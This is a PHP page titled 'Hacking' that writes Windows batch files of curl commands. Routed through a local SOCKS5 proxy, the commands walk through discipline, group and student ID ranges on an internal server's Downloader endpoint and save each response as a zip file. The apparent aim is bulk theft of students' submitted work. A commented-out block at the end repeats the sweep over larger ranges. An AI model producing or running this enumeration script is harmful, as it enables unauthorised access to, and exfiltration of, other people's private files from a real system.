<!doctype html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


    <title>Hacking</title>
    <link href="css/bootstrap.css" rel="stylesheet">
</head>
<body>
<?php

        $file = 'Parall.txt';
      $current = file_get_contents($file);
      $current.="Mkdir Para\n";
     $Disc=47 ;
        $Group=176;
            for ($Student=2400; $Student <2470 ; $Student++) { 
                for ($Count=1; $Count <4 ; $Count++) { 
                    $Type=2;
                        for ($num=0; $num <7 ; $num++) { 
                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/Para/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                        }
                    }
                }

     $current .="pause";
     file_put_contents($file, $current);
     
     $file = 'WEB2.txt';
     $current = file_get_contents($file);
     $current.="Mkdir Web2\n";
    $Disc=46 ;
       $Group=176;
       for ($Student=2400; $Student <2470 ; $Student++) { 
               for ($Count=1; $Count <4 ; $Count++) { 
                   $Type=2;
                       for ($num=0; $num <14 ; $num++) { 
                           $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/Web2/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                       }
                   }
               }

    $current .="pause";
    file_put_contents($file, $current);

   
    
    $file = 'BD.bat';
    $current = file_get_contents($file);
    $current.="Mkdir BD\n";
   $Disc=204 ;
      $Group=177;
      for ($Student=2400; $Student <2470 ; $Student++) { 
              for ($Count=1; $Count <4 ; $Count++) { 
                  $Type=2;
                      for ($num=0; $num <14 ; $num++) { 
                          $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/BD/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                      }
                  }
              }

   $current .="pause";
   file_put_contents($file, $current);
echo "final";

    ?> 
</body>
</html>



<!-- $file = 'people.txt';
      $current = file_get_contents($file);
      $current.="Mkdir file\n";
     for ($Disc=40; $Disc <50 ; $Disc++) { 
        for ($Group=176; $Group < 178; $Group++) { 
            for ($Student=2400; $Student <2500 ; $Student++) { 
               // $current = file_get_contents($file);
                for ($Count=0; $Count <5 ; $Count++) { 
                    for ($Type=0; $Type <10 ; $Type++) { 
                        for ($num=0; $num <20 ; $num++) { 
                           // $current.="Mkdir ";
                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/file/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                        }
                    }
                }
               // file_put_contents($file, $current);
            }
        }
     }
     $current .="pause";
     file_put_contents($file, $current); -->